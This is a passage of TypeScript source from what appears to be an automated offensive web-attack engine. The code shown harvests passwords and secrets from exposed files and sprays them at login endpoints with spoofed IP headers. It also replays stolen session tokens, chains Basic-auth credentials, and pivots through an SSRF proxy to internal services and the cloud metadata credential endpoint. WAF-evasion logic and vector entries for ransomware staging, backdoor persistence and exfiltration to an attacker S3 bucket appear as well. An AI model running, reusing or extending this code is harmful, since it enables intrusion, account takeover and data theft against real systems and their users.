    phase6.totalDumpFiles = phase6.dumpFiles.length;
    phase6.totalDumpBytes = phase6.dumpFiles.reduce((sum: number, d: any) => sum + d.sizeBytes, 0);
    phases.push(phase6);

    const phase7: any = {
      phase: "PHASE_7_AUTO_LOGIN_COMBINATOR",
      label: "Auto-Login Combinator — Exfil Credential Injection",
      triggered: false,
      triggerReason: "AWAITING_EXFIL_DATA",
      attempts: [],
      startedAt: Date.now(),
    };

    // --- PHASE 8: OFFENSIVE ABUSE ENGINE (APT LEVEL 5) --- PRE-SCAN
    const phase8_pre: any = {
      name: "OFFENSIVE_ABUSE_ENGINE",
      status: "ACTIVATED",
      vectorsAttempted: 4,
      totalConfirmed: 0,
      operationalScore: 0,
      chainedAttacks: [] as any[],
      logs: [] as string[]
    };

    const hasRedisAccess = phase4.probes.some((p: any) => p.category === "redis" && (p.verdict === "TUNNEL_OPEN" || p.verdict === "ACCESSIBLE"));
    if (phase4.tunnelsOpen > 0 && hasRedisAccess) {
      const stealthDelay = 50;
      phase8_pre.logs.push(`[DUMPING] Autônomo iniciado via túnel Redis em localhost:6379 com delay ${stealthDelay}ms`);
    }

    const preScanThreats = phase3.entriesGranted + phase4.tunnelsOpen + phase5.escalated + phase6.sensitiveExtracted;
    if (preScanThreats > 30) {
      phase8_pre.logs.push("[SABOTAGE] Detectado potencial de injeção em endpoints de checkout");
    }

    if (phase7.capturedToken || phase5.escalated > 0) {
      phase8_pre.logs.push("[TAKEOVER] Sessões administrativas ativas detectadas para análise de persistência");
    }

    phase8_pre.operationalScore = (phase8_pre.totalConfirmed / phase8_pre.vectorsAttempted) * 10;

    const exfilCreds: { key: string; value: string; type: string }[] = [];
    for (const ext of phase6.extractions) {
      if (ext.credentialsFound > 0 && ext.extracted) {
        try {
          const controller = new AbortController();
          const timeout = setTimeout(() => controller.abort(), 3000);
          const refetch = await fetch(`${baseUrl}${ext.target}`, {
            method: "GET",
            headers: { "User-Agent": "MSE-Combinator/2.0" },
            signal: controller.signal,
            redirect: "manual",
          });
          clearTimeout(timeout);
          if (refetch.status === 200) {
            const refBody = await refetch.text();
            const CRED_PATTERNS = [
              { pattern: /(?:^|\s|=|:)([A-Za-z0-9_]*(?:PASSWORD|PASSWD|PWD)[A-Za-z0-9_]*)\s*[=:]\s*["']?([^\s"'\n]{1,200})["']?/gim, type: "PASSWORD" },
              { pattern: /(?:^|\s|=|:)([A-Za-z0-9_]*(?:SECRET|PRIVATE[_.]?KEY|AUTH[_.]?TOKEN)[A-Za-z0-9_]*)\s*[=:]\s*["']?([^\s"'\n]{1,200})["']?/gim, type: "SECRET" },
              { pattern: /(?:^|\s|=|:)([A-Za-z0-9_]*(?:DATABASE[_.]?URL|REDIS[_.]?URL|MONGO[_.]?URI)[A-Za-z0-9_]*)\s*[=:]\s*["']?([^\s"'\n]{6,500})["']?/gim, type: "URL" },
            ];
            for (const { pattern, type } of CRED_PATTERNS) {
              let match;
              const regex = new RegExp(pattern.source, pattern.flags);
              while ((match = regex.exec(refBody)) !== null) {
                const key = match[1]?.trim();
                const value = match[2]?.trim();
                if (key && value && value.length > 2) {
                  exfilCreds.push({ key, value, type });
                }
              }
            }
          }
        } catch {}
      }
    }

    const exfilPasswords = exfilCreds.filter(c => c.type === "PASSWORD").map(c => c.value);
    const exfilSecrets = exfilCreds.filter(c => c.type === "SECRET").map(c => c.value);
    const exfilUrls = exfilCreds.filter(c => c.type === "URL").map(c => c.value);

    const relaySnapshot = { ...credentialRelay };
    for (const relayPwd of relaySnapshot.infraSecrets) {
      if (!exfilPasswords.includes(relayPwd)) {
        exfilPasswords.push(relayPwd);
      }
    }
    for (const relayToken of relaySnapshot.sessionTokens) {
      if (!exfilSecrets.includes(relayToken)) {
        exfilSecrets.push(relayToken);
      }
    }
    for (const relayUser of relaySnapshot.discoveredUsers) {
      if (!discoveredUsers.includes(relayUser)) {
        discoveredUsers.push(relayUser);
      }
    }
    for (const relayDb of relaySnapshot.dbCredentials) {
      if (!exfilUrls.includes(relayDb)) {
        exfilUrls.push(relayDb);
      }
    }

    if (exfilPasswords.length > 0 || exfilSecrets.length > 0) {
      log(`[COMBINATOR] Phase 7 relay merge — +${relaySnapshot.infraSecrets.length} relay passwords, +${relaySnapshot.sessionTokens.length} relay tokens, +${relaySnapshot.discoveredUsers.length} relay users`, "admin");
    }

    const adminEndpoints = phase1.endpoints
      .filter((e: any) => e.hasLoginForm || e.redirectsToLogin || e.verdict === "HAS_FORM")
      .map((e: any) => e.path);
    if (adminEndpoints.length === 0) {
      adminEndpoints.push("/login", "/api/auth/login", "/admin/login", "/api/login");
    }

    if (exfilPasswords.length > 0 || exfilSecrets.length > 0) {
      phase7.triggered = true;
      phase7.triggerReason = `EXFIL_CREDS_FOUND: ${exfilPasswords.length} passwords, ${exfilSecrets.length} secrets`;
      phase7.exfilCredentialCount = exfilCreds.length;
      phase7.exfilPasswordCount = exfilPasswords.length;
      phase7.exfilSecretCount = exfilSecrets.length;
      phase7.exfilUrlCount = exfilUrls.length;

      log(`[COMBINATOR] Phase 7 ACTIVATED — ${exfilPasswords.length} passwords + ${exfilSecrets.length} secrets extracted → auto-login on ${adminEndpoints.length} endpoints`, "admin");

      const loginUsers = discoveredUsers.length > 0
        ? discoveredUsers.slice(0, 4)
        : ["admin", "root", "administrator"];

      const loginPasswords = [...new Set([...exfilPasswords.slice(0, 6), ...exfilSecrets.slice(0, 3)])];

      let phase7Success = false;
      let phase7Token = "";
      let phase7AttemptCount = 0;
      const maxPhase7Attempts = Math.min(loginUsers.length * loginPasswords.length * adminEndpoints.slice(0, 3).length, 24);

      for (const user of loginUsers) {
        if (phase7AttemptCount >= maxPhase7Attempts || phase7Success) break;
        for (const ep of adminEndpoints.slice(0, 3)) {
          if (phase7AttemptCount >= maxPhase7Attempts || phase7Success) break;
          for (const pwd of loginPasswords) {
            if (phase7AttemptCount >= maxPhase7Attempts || phase7Success) break;
            phase7AttemptCount++;

            try {
              const controller = new AbortController();
              const timeout = setTimeout(() => controller.abort(), 4000);
              const resp = await fetch(`${baseUrl}${ep}`, {
                method: "POST",
                headers: {
                  "Content-Type": "application/json",
                  "User-Agent": "MSE-Combinator/2.0 AutoLogin",
                  "X-Forwarded-For": `${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                },
                body: JSON.stringify({ username: user, email: user, password: pwd }),
                signal: controller.signal,
                redirect: "manual",
              });
              clearTimeout(timeout);

              const status = resp.status;
              const setCookie = resp.headers.get("set-cookie") || "";
              const hasNewSession = setCookie.includes("session") || setCookie.includes("token") || setCookie.includes("jwt");
              const body = await resp.text();
              const hasToken = /token|jwt|access_token|bearer/i.test(body);
              const isSuccess = (status === 200 && (hasNewSession || hasToken)) || status === 302;

              if (isSuccess) {
                phase7Success = true;
                phase7Token = hasToken ? "[JWT_CAPTURED_EXFIL]" : hasNewSession ? "[SESSION_CAPTURED_EXFIL]" : "[REDIRECT_AUTH_EXFIL]";
              }

              phase7.attempts.push({
                user,
                endpoint: ep,
                credentialSource: "DEEP_EXFIL",
                password: pwd,
                rawResponsePreview: body.substring(0, 2000),
                status,
                hasNewSession,
                hasToken,
                verdict: isSuccess ? "ENTRY_GRANTED_EXFIL" : status === 403 ? "WAF_BLOCKED" : status === 429 ? "RATE_LIMITED" : "DENIED",
              });
            } catch (err: any) {
              phase7.attempts.push({
                user,
                endpoint: ep,
                credentialSource: "DEEP_EXFIL",
                status: 0,
                verdict: "ERROR",
                error: err.message,
              });
            }
          }
        }
      }

      phase7.completedAt = Date.now();
      phase7.totalAttempts = phase7.attempts.length;
      phase7.entriesGranted = phase7.attempts.filter((a: any) => a.verdict === "ENTRY_GRANTED_EXFIL").length;
      phase7.wafBlocked = phase7.attempts.filter((a: any) => a.verdict === "WAF_BLOCKED").length;
      phase7.capturedToken = phase7Success ? phase7Token : null;

      if (phase7Success) {
        log(`[COMBINATOR] Phase 7 BREACH — Auto-login successful using exfiltrated credentials → ${phase7Token}`, "admin");
      }
    } else {
      phase7.triggerReason = "NO_EXFIL_CREDENTIALS";
      phase7.completedAt = Date.now();
      phase7.totalAttempts = 0;
      phase7.entriesGranted = 0;
    }

    phases.push(phase7);

    const phase8: any = {
      phase: "PHASE_8_OFFENSIVE_ABUSE",
      label: "Offensive Abuse Engine — APT Confirmation Protocol",
      triggered: false,
      startedAt: Date.now(),
      abuseMatrix: [],
      confirmations: [],
      chainedAttacks: [],
      operationalScore: 0,
      decisionLog: [],
    };

    const phase9: any = {
      phase: "PHASE_9_DESTRUCTION_MODULE",
      label: "Strategic Destruction & Cover-Up",
      triggered: false,
      startedAt: Date.now(),
      actions: [],
    };

    const allCapturedCreds: string[] = [...exfilPasswords, ...exfilSecrets];
    const allTokens: string[] = [...sessionTokens];
    const allUsers: string[] = [...discoveredUsers];
    const openTunnels = phase4.probes.filter((p: any) => p.verdict === "TUNNEL_OPEN" || p.verdict === "ACCESSIBLE");
    const grantedEntries = phase3.attempts.filter((a: any) => a.verdict === "ENTRY_GRANTED");
    const grantedPhase7 = phase7.attempts?.filter((a: any) => a.verdict === "ENTRY_GRANTED_EXFIL") || [];
    const sensitiveExtractions = phase6.extractions?.filter((e: any) => e.sensitive && e.extracted) || [];
    const escalatedTokens = phase5.injections?.filter((i: any) => i.verdict === "ESCALATED" || i.verdict === "ACCEPTED") || [];

    const totalProbes = phase4.probes.length || 1;
    const totalLoginAttempts = phase3.totalAttempts || 1;
    const totalInjections = phase5.injections?.length || 1;
    const totalExtractions = phase6.extractions?.length || 1;
    const redisTunnels = phase4.probes.filter((p: any) => /redis/i.test(p.tunnel || p.desc || "") && (p.verdict === "TUNNEL_OPEN" || p.verdict === "ACCESSIBLE"));
    const adminFormsFound = phase1.endpoints.filter((e: any) => e.hasLoginForm || e.redirectsToLogin).length;
    const confirmedAdminPaths = Math.min(adminFormsFound + grantedEntries.length + grantedPhase7.length, 10);

    const dictHasAwsKey = uniqueDict.some((d: string) => /^AKIA/i.test(d)) || infraSecrets.some((s: string) => /^AKIA/i.test(s));
    const dictHasRedisAuth = uniqueDict.some((d: string) => /r3d1s|redis.*pass|REDIS_AUTH/i.test(d)) || infraSecrets.some((s: string) => /r3d1s|redis.*pass|REDIS_AUTH/i.test(s));
    const dictHasRecaptcha = uniqueDict.some((d: string) => /^6L[a-zA-Z0-9]{8,}/i.test(d)) || infraSecrets.some((s: string) => /^6L[a-zA-Z0-9]{8,}/i.test(s));

    const hasCloudCred = dictHasAwsKey || allCapturedCreds.some(c => /^AKIA|aws_secret|AWS_ACCESS/i.test(c));
    const hasSsrfVector = openTunnels.length > 0;
    const correlationBoost = (hasCloudCred && hasSsrfVector) ? 8.0 : 1.0;

    const telemetry = {
      ssrfSuccessRate: openTunnels.length / totalProbes,
      credentialSuccessRate: grantedEntries.length / totalLoginAttempts,
      tokenEscalationRate: escalatedTokens.length / totalInjections,
      dataExfilRate: sensitiveExtractions.length / totalExtractions,
      redisAccessRate: redisTunnels.length / Math.max(phase4.probes.filter((p: any) => /redis/i.test(p.tunnel || p.desc || "")).length, 1),
      envExtractRate: sensitiveExtractions.filter((e: any) => /env|config|docker/i.test(e.desc || "")).length / totalExtractions,
      adminPathRate: confirmedAdminPaths / 10,
      jwtCaptureRate: allTokens.filter((t: string) => /^eyJ/i.test(t)).length / Math.max(allTokens.length, 1),
      dictionarySize: uniqueDict.length,
      dictAwsBoost: dictHasAwsKey,
      dictRedisBoost: dictHasRedisAuth,
      correlationMultiplier: correlationBoost,
    };

    log(`[PHASE8-TELEMETRY] SSRF=${(telemetry.ssrfSuccessRate * 100).toFixed(1)}% | CRED=${(telemetry.credentialSuccessRate * 100).toFixed(1)}% | TOKEN=${(telemetry.tokenEscalationRate * 100).toFixed(1)}% | EXFIL=${(telemetry.dataExfilRate * 100).toFixed(1)}% | REDIS=${(telemetry.redisAccessRate * 100).toFixed(1)}% | ADMIN=${(telemetry.adminPathRate * 100).toFixed(1)}% | DICT=${telemetry.dictionarySize} | AWS_BOOST=${telemetry.dictAwsBoost} | CORRELATION=${telemetry.correlationMultiplier}x`, "admin");

    const computeConfidence = (vecId: string, baseWeight: number): { confidence: number; formula: string; boosts: string[] } => {
      let conf = baseWeight;
      let formula = "";
      const boosts: string[] = [];

      switch (vecId) {
        case "TOKEN_REPLAY": {
          const escalationFactor = telemetry.tokenEscalationRate;
          const tokenCount = Math.min(allTokens.length + escalatedTokens.length, 10) / 10;
          conf = baseWeight * Math.max(escalationFactor, tokenCount, 0.3);
          formula = `${baseWeight} × max(escalation=${(escalationFactor * 100).toFixed(1)}%, tokenDensity=${(tokenCount * 100).toFixed(1)}%, floor=30%)`;
          if (escalatedTokens.length > 0) { boosts.push(`ESCALATED_TOKENS(+${escalatedTokens.length})`); conf = Math.min(conf * 1.2, 1.0); }
          break;
        }
        case "CREDENTIAL_CHAIN": {
          const credRate = telemetry.credentialSuccessRate;
          const credDensity = Math.min(allCapturedCreds.length, 10) / 10;
          conf = baseWeight * Math.max(credRate, credDensity, 0.2);
          formula = `${baseWeight} × max(credRate=${(credRate * 100).toFixed(1)}%, credDensity=${(credDensity * 100).toFixed(1)}%, floor=20%)`;
          if (dictHasAwsKey) { conf = 1.0; boosts.push("AWS_KEY_OVERRIDE(p=1.0)"); formula += " → FORCED 1.0 (AKIA pattern in dictionary)"; }
          if (dictHasRedisAuth) { conf = Math.min(conf * 1.15, 1.0); boosts.push("REDIS_AUTH_BOOST(+15%)"); }
          break;
        }
        case "SSRF_PIVOT": {
          conf = baseWeight * telemetry.ssrfSuccessRate;
          formula = `${baseWeight} × ssrfRate=${(telemetry.ssrfSuccessRate * 100).toFixed(1)}%`;
          if (correlationBoost > 1) { conf = Math.min(conf * correlationBoost, 1.0); boosts.push(`CORRELATION_CLOUD_SSRF(×${correlationBoost})`); formula += ` × correlation=${correlationBoost}x`; }
          if (openTunnels.length >= 10) { conf = Math.min(conf * 1.1, 1.0); boosts.push("HIGH_TUNNEL_DENSITY(+10%)"); }
          break;
        }
        case "ADMIN_TAKEOVER": {
          conf = baseWeight * telemetry.adminPathRate;
          formula = `${baseWeight} × adminPaths=${confirmedAdminPaths}/10`;
          if (grantedPhase7.length > 0) { conf = Math.min(conf * 1.25, 1.0); boosts.push(`EXFIL_LOGIN_SUCCESS(+25%)`); }
          if (successfulEntry) { conf = Math.min(conf * 1.3, 1.0); boosts.push("PHASE3_ENTRY_GRANTED(+30%)"); }
          break;
        }
        case "DATA_EXFIL_CONFIRM": {
          conf = baseWeight * telemetry.dataExfilRate;
          formula = `${baseWeight} × exfilRate=${(telemetry.dataExfilRate * 100).toFixed(1)}%`;
          const sensitiveCount = sensitiveExtractions.length;
          if (sensitiveCount >= 3) { conf = Math.min(conf * 1.2, 1.0); boosts.push(`HIGH_SENSITIVITY(${sensitiveCount} extractions, +20%)`); }
          break;
        }
        case "JWT_FORGE": {
          const jwtRate = telemetry.jwtCaptureRate;
          const jwtCount = allTokens.filter((t: string) => /^eyJ/i.test(t)).length;
          conf = baseWeight * Math.max(jwtRate, jwtCount > 0 ? 0.5 : 0, 0.1);
          formula = `${baseWeight} × max(jwtRate=${(jwtRate * 100).toFixed(1)}%, jwtPresent=${jwtCount > 0 ? "50%" : "0%"}, floor=10%)`;
          if (escalatedTokens.some((e: any) => /jwt|eyJ/i.test(e.tokenPreview || ""))) { conf = Math.min(conf * 1.3, 1.0); boosts.push("JWT_ESCALATION_CONFIRMED(+30%)"); }
          break;
        }
        case "REDIS_ABUSE": {
          conf = baseWeight * telemetry.redisAccessRate;
          formula = `${baseWeight} × redisRate=${(telemetry.redisAccessRate * 100).toFixed(1)}%`;
          if (dictHasRedisAuth) { conf = Math.min(conf * 1.25, 1.0); boosts.push("REDIS_PASS_IN_DICT(+25%)"); }
          if (redisTunnels.length >= 3) { conf = Math.min(conf * 1.15, 1.0); boosts.push(`MULTI_REDIS_TUNNEL(${redisTunnels.length}, +15%)`); }
          break;
        }
        case "ENV_HARVEST": {
          conf = baseWeight * telemetry.envExtractRate;
          formula = `${baseWeight} × envRate=${(telemetry.envExtractRate * 100).toFixed(1)}%`;
          if (dictHasAwsKey || dictHasRecaptcha) { conf = Math.min(conf * 1.2, 1.0); boosts.push("INFRA_KEY_IN_ENV(+20%)"); }
          break;
        }
      }

      conf = parseFloat(Math.min(Math.max(conf, 0.01), 1.0).toFixed(4));
      return { confidence: conf, formula, boosts };
    };

    const ABUSE_VECTORS = [
      { id: "TOKEN_REPLAY", label: "Session Token Replay", weight: 0.95, requires: "tokens", category: "session_hijack" },
      { id: "CREDENTIAL_CHAIN", label: "Credential Chain Escalation", weight: 0.90, requires: "credentials", category: "privilege_escalation" },
      { id: "SSRF_PIVOT", label: "SSRF Tunnel Pivot Abuse", weight: 0.88, requires: "ssrf_tunnels", category: "lateral_movement" },
      { id: "ADMIN_TAKEOVER", label: "Admin Panel Takeover", weight: 0.92, requires: "admin_entry", category: "full_compromise" },
      { id: "DATA_EXFIL_CONFIRM", label: "Data Exfiltration Confirmation", weight: 0.85, requires: "sensitive_data", category: "data_breach" },
      { id: "JWT_FORGE", label: "JWT Token Forge & Replay", weight: 0.87, requires: "jwt_tokens", category: "auth_bypass" },
      { id: "REDIS_ABUSE", label: "Redis Command Injection", weight: 0.93, requires: "redis_tunnel", category: "infra_takeover" },
      { id: "ENV_HARVEST", label: "Environment Variable Harvest", weight: 0.80, requires: "env_access", category: "secret_extraction" },
      { 
    id: "K8S_ESCAPE", 
    label: "Kubernetes Container Escape", 
    weight: 0.96, 
    requires: "k8s_api", 
    category: "container_escape" 
  },

  // NOVOS: Cloud Takeover
  { 
    id: "CLOUD_FULL_TAKEOVER", 
    label: "Cloud Provider Full Compromise", 
    weight: 0.99, 
    requires: "cloud_creds", 
    category: "cloud_compromise" 
  },

  // NOVOS: Persistence Installation
  { 
    id: "PERSISTENCE_INSTALL", 
    label: "Backdoor & Persistence Installation", 
    weight: 0.98, 
    requires: "admin_access", 
    category: "persistence" 
  },

  // NOVOS: Ransomware Prep
  { 
    id: "RANSOMWARE_STAGING", 
    label: "Ransomware Staging & Encryption Prep", 
    weight: 0.95, 
    requires: "file_access", 
    category: "destruction" 
  },

  // NOVOS: Data Exfiltration to Cloud
  { 
    id: "DATA_EXFIL_CLOUD", 
    label: "Auto-Exfiltrate to Attacker S3", 
    weight: 0.94, 
    requires: "cloud_creds", 
    category: "exfiltration" 
  },

    ];

    const hasTokens = allTokens.length > 0 || escalatedTokens.length > 0;
    const hasCreds = allCapturedCreds.length > 0;
    const hasSsrfTunnels = openTunnels.length > 0;
    const hasAdminEntry = grantedEntries.length > 0 || grantedPhase7.length > 0;
    const hasSensitiveData = sensitiveExtractions.length > 0;
    const hasJwt = allTokens.some((t: string) => /^eyJ/i.test(t)) || phase5.injections?.some((i: any) => /jwt|eyJ/i.test(i.tokenPreview || ""));
    const hasRedis = openTunnels.some((t: any) => /redis/i.test(t.tunnel || t.desc || ""));
    const hasEnvAccess = sensitiveExtractions.some((e: any) => /env|config|docker/i.test(e.desc || ""));

    const availabilityMap: Record<string, boolean> = {
      tokens: hasTokens,
      credentials: hasCreds,
      ssrf_tunnels: hasSsrfTunnels,
      admin_entry: hasAdminEntry,
      sensitive_data: hasSensitiveData,
      jwt_tokens: hasJwt,
      redis_tunnel: hasRedis,
      env_access: hasEnvAccess,
    };

    const activeVectors = ABUSE_VECTORS.filter(v => availabilityMap[v.requires]);

    let consecutiveBlocks = 0;
    let hibernateMode = false;
    let hibernateCount = 0;
    const STEALTH_BLOCK_THRESHOLD = 3;
    const HIBERNATE_DELAY_MS = 500;

    if (activeVectors.length > 0) {
      phase8.triggered = true;
      phase8.triggerReason = `${activeVectors.length} ABUSE VECTORS AVAILABLE — ${activeVectors.map(v => v.id).join(", ")}`;
      phase8.telemetry = telemetry;

      log(`[COMBINATOR] Phase 8 ACTIVATED — ${activeVectors.length} offensive abuse vectors qualified (DETERMINISTIC MODE)`, "admin");

      for (const vec of activeVectors) {
        const { confidence, formula, boosts } = computeConfidence(vec.id, vec.weight);
        phase8.abuseMatrix.push({
          vector: vec.id,
          label: vec.label,
          category: vec.category,
          baseWeight: vec.weight,
          confidence,
          formula,
          boosts,
          status: "QUEUED",
        });
        phase8.decisionLog.push({
          action: "VECTOR_SCORED",
          vector: vec.id,
          reason: `DETERMINISTIC: ${formula}${boosts.length > 0 ? ` | BOOSTS: ${boosts.join(", ")}` : ""} → p=${(confidence * 100).toFixed(2)}%`,
          timestamp: Date.now(),
        });
        log(`[PHASE8-SCORE] ${vec.id}: p=${(confidence * 100).toFixed(2)}% | ${formula}${boosts.length > 0 ? ` | ${boosts.join(", ")}` : ""}`, "admin");
      }

      phase8.abuseMatrix.sort((a: any, b: any) => b.confidence - a.confidence);
      log(`[COMBINATOR] Abuse matrix ranked (DETERMINISTIC) — #1: ${phase8.abuseMatrix[0].label} (p=${(phase8.abuseMatrix[0].confidence * 100).toFixed(2)}%)`, "admin");

      const stealthTrack = (status: number, verdict: string) => {
        if (status === 403 || status === 429 || verdict === "WAF_BLOCKED" || verdict === "RATE_LIMITED") {
          consecutiveBlocks++;
          if (consecutiveBlocks >= STEALTH_BLOCK_THRESHOLD && !hibernateMode) {
            hibernateMode = true;
            hibernateCount++;
            phase8.decisionLog.push({
              action: "STEALTH_HIBERNATE",
              vector: "THROTTLE",
              reason: `${consecutiveBlocks} consecutive blocks detected — HIBERNATE #${hibernateCount} activated (${HIBERNATE_DELAY_MS}ms cooldown, adaptive UA rotation)`,
              timestamp: Date.now(),
            });
            log(`[STEALTH] HIBERNATE #${hibernateCount} — ${consecutiveBlocks} consecutive WAF blocks — engaging evasion`, "admin");
          }
        } else {
          consecutiveBlocks = 0;
          if (hibernateMode) {
            hibernateMode = false;
            phase8.decisionLog.push({
              action: "STEALTH_RESUME",
              vector: "THROTTLE",
              reason: `Block sequence broken — resuming normal operation after HIBERNATE #${hibernateCount}`,
              timestamp: Date.now(),
            });
          }
        }
      };

      const stealthHeaders = () => {
        const uas = [
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/121.0.0.0 Safari/537.36",
          "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Safari/605.1.15",
          "Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/122.0",
          "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Edg/121.0.0.0",
          "Mozilla/5.0 (iPhone; CPU iPhone OS 17_3 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        ];
        return {
          "User-Agent": hibernateMode ? uas[hibernateCount % uas.length] : "MSE-AbuseEngine/1.0",
          "X-Forwarded-For": `${Math.floor(Math.random() * 223) + 1}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
          "Accept": "text/html,application/json,*/*;q=0.8",
          ...(hibernateMode ? { "Accept-Language": "en-US,en;q=0.9,pt-BR;q=0.8", "Cache-Control": "no-cache" } : {}),
        };
      };

      const stealthDelay = async () => {
        if (hibernateMode) {
          await new Promise(r => setTimeout(r, HIBERNATE_DELAY_MS + Math.floor(Math.random() * 300)));
        }
      };

      for (const matrixEntry of phase8.abuseMatrix) {
        const vec = ABUSE_VECTORS.find(v => v.id === matrixEntry.vector)!;
        matrixEntry.status = "EXECUTING";
        const confirmation: any = {
          vector: vec.id,
          label: vec.label,
          category: vec.category,
          attempts: [],
          confirmed: false,
          startedAt: Date.now(),
          stealthHibernations: 0,
        };

        try {
          if (vec.id === "TOKEN_REPLAY" && hasTokens) {
            const tokensToReplay = [...allTokens.slice(0, 3), ...escalatedTokens.map((e: any) => e.tokenPreview || "").filter(Boolean).slice(0, 2)];
            const replayEndpoints = ["/api/user/profile", "/api/admin/dashboard", "/api/v1/me", "/admin/api/users", "/api/account"];

            for (const token of tokensToReplay) {
              for (const ep of replayEndpoints.slice(0, 3)) {
                try {
                  await stealthDelay();
                  const controller = new AbortController();
                  const timeout = setTimeout(() => controller.abort(), 4000);
                  const resp = await fetch(`${baseUrl}${ep}`, {
                    method: "GET",
                    headers: {
                      ...stealthHeaders(),
                      "Authorization": `Bearer ${token}`,
                      "Cookie": `session=${token}; token=${token}`,
                    },
                    signal: controller.signal,
                    redirect: "manual",
                  });
                  clearTimeout(timeout);
                  const body = await resp.text();
                  const hasUserData = /email|username|admin|role|name|account/i.test(body);
                  const isConfirmed = resp.status === 200 && hasUserData;
                  const verdict = isConfirmed ? "ABUSE_CONFIRMED" : resp.status === 401 ? "TOKEN_REJECTED" : resp.status === 403 ? "WAF_BLOCKED" : resp.status === 429 ? "RATE_LIMITED" : "NO_DATA";
                  stealthTrack(resp.status, verdict);

                  confirmation.attempts.push({
                    endpoint: ep,
                    token_raw: token,
                    token: token.substring(0, 30) + "...",
                    method: "TOKEN_REPLAY",
                    status: resp.status,
                    confirmed: isConfirmed,
                    raw_response: body,
                    responsePreview: body.substring(0, 500),
                    verdict,
                    hibernateActive: hibernateMode,
                  });

                  if (isConfirmed) {
                    confirmation.confirmed = true;
                    log(`[ABUSE] TOKEN_REPLAY CONFIRMED — ${ep} responded with user data using captured token`, "admin");
                  }
                } catch {}
              }
              if (confirmation.confirmed) break;
            }
          }

          if (vec.id === "CREDENTIAL_CHAIN" && hasCreds) {
            const chainEndpoints = ["/api/admin/users", "/api/v1/admin/config", "/admin/api/settings", "/api/internal/secrets"];
            const sprayPasswords = [...new Set([...allCapturedCreds.slice(0, 3)])];
            const credPairs = allUsers
              .slice(0, 3)
              .flatMap(u => sprayPasswords.map(p => ({ user: u, pass: p, source: "EXFIL" })));

            for (const pair of credPairs.slice(0, 8)) {
              for (const ep of chainEndpoints.slice(0, 2)) {
                try {
                  await stealthDelay();
                  const controller = new AbortController();
                  const timeout = setTimeout(() => controller.abort(), 4000);
                  const authHeader = Buffer.from(`${pair.user}:${pair.pass}`).toString("base64");
                  const resp = await fetch(`${baseUrl}${ep}`, {
                    method: "GET",
                    headers: {
                      ...stealthHeaders(),
                      "Authorization": `Basic ${authHeader}`,
                    },
                    signal: controller.signal,
                    redirect: "manual",
                  });
                  clearTimeout(timeout);
                  const body = await resp.text();
                  const hasAdmin = /admin|config|secret|credential|settings|users/i.test(body);
                  const isConfirmed = resp.status === 200 && hasAdmin;
                  const verdict = isConfirmed ? "ABUSE_CONFIRMED" : resp.status === 403 ? "WAF_BLOCKED" : resp.status === 429 ? "RATE_LIMITED" : "DENIED";
                  stealthTrack(resp.status, verdict);

                  confirmation.attempts.push({
                    endpoint: ep,
                    user: pair.user,
                    pass_raw: pair.pass,
                    source: pair.source,
                    method: "BASIC_AUTH_CHAIN",
                    status: resp.status,
                    confirmed: isConfirmed,
                    raw_response: body,
                    responsePreview: body.substring(0, 500),
                    verdict,
                    hibernateActive: hibernateMode,
                  });

                  if (isConfirmed) {
                    confirmation.confirmed = true;
                    log(`[ABUSE] CREDENTIAL_CHAIN CONFIRMED — ${pair.user}@${ep} elevated to admin (source: ${pair.source})`, "admin");
                  }
                } catch {}
              }
              if (confirmation.confirmed) break;
            }
          }

          if (vec.id === "SSRF_PIVOT" && hasSsrfTunnels) {
            const pivotTargets = [
              "http://localhost:9200/_cat/indices",
              "http://localhost:5432/",
              "http://localhost:27017/",
              "http://localhost:8500/v1/agent/services",
              "http://localhost:3000/api/admin",
              "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            ];

            for (const pivot of pivotTargets.slice(0, 4)) {
              try {
                await stealthDelay();
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 4000);
                const resp = await fetch(`${baseUrl}/api/proxy?url=${encodeURIComponent(pivot)}`, {
                  method: "GET",
                  headers: { ...stealthHeaders() },
                  signal: controller.signal,
                  redirect: "manual",
                });
                clearTimeout(timeout);
                const body = await resp.text();
                const hasData = body.length > 50 && !/error|not found|forbidden/i.test(body.substring(0, 100));
                const isConfirmed = resp.status === 200 && hasData;
                const verdict = isConfirmed ? "ABUSE_CONFIRMED" : resp.status === 403 ? "WAF_BLOCKED" : resp.status === 429 ? "RATE_LIMITED" : "BLOCKED";
                stealthTrack(resp.status, verdict);

                confirmation.attempts.push({
                  endpoint: `/api/proxy → ${pivot}`,
                  method: "SSRF_PIVOT",
                  status: resp.status,
                  confirmed: isConfirmed,
                  responseLength: body.length,
                  raw_response: body,
                  responsePreview: body.substring(0, 500),
                  verdict,
                  hibernateActive: hibernateMode,
                });

                if (isConfirmed) {
                  confirmation.confirmed = true;
                  log(`[ABUSE] SSRF_PIVOT CONFIRMED — Lateral movement to ${pivot} successful`, "admin");
                }
              } catch {}
            }
          }

          if (vec.id === "ADMIN_TAKEOVER" && hasAdminEntry) {
            const adminOps = [
              { path: "/api/admin/users", method: "GET", desc: "User enumeration" },
              { path: "/api/admin/config", method: "GET", desc: "Config extraction" },
              { path: "/admin/api/settings", method: "GET", desc: "Settings dump" },
            ];

            const authToken = capturedToken || phase7.capturedToken || allTokens[0] || "";
            for (const op of adminOps) {
              try {
                await stealthDelay();
                const controller = new AbortController();
                const timeout = setTimeout(() => controller.abort(), 4000);
                const resp = await fetch(`${baseUrl}${op.path}`, {
                  method: op.method,
                  headers: {
                    ...stealthHeaders(),
                    "Authorization": `Bearer ${authToken}`,
                    "Cookie": `session=${authToken}; admin=true`,
                  },
                  signal: controller.signal,
                  redirect: "manual",
                });
                clearTimeout(timeout);
                const body = await resp.text();
                const hasAdmin = /user|email|config|setting|admin|role/i.test(body);
                const isConfirmed = resp.status === 200 && hasAdmin;
